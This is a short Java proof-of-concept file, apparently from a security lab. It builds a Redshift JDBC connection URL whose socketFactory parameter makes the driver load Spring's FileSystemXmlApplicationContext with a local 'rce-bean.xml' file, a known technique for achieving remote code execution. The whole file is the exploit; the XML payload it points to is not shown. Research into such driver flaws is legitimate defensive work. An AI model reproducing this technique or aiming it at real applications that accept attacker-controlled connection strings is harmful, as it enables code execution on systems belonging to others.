package com.lab;

import java.sql.DriverManager;
import java.sql.SQLException;

public class Main {
    public static void main( String[] args ) throws SQLException, SQLException {
        String xml_path = Main.class.getClassLoader().getResource("").getPath() + "/rce-bean.xml";
        String evil_arg = "file:///" + xml_path;
        String magic_class = "org.springframework.context.support.FileSystemXmlApplicationContext";
        DriverManager.getConnection("jdbc:redshift://127.0.0.1:5439/dev?socketFactory=" + magic_class + "&socketFactoryArg=" + evil_arg);
    }
}